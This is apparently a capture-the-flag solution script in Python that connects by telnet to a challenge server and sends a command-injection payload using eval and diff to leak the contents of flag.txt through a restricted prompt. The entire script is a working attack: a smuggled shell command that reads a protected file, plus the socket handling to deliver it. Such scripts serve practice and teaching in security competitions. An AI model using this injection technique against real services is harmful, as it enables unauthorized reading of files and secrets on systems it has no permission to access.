from telnetlib import Telnet

with Telnet('challs.xmas.htsp.ro', 6004) as tn:
    while True:
        line = tn.read_until(b"\n")
        print(line)
        if b'WHAT IS BOTHERING YOU???' in line:
            break

    cmd = bytearray()
    cmd += b"eval $(echo flag=$(diff flag.txt .dockerenv)); echo $flag\n"

    tn.write(cmd)

    while True:
        line = tn.read_until(b"\n")
        print(line)
        if b'YOUR COMPLAINT HAS BEEN RECORDED' in line:
            break
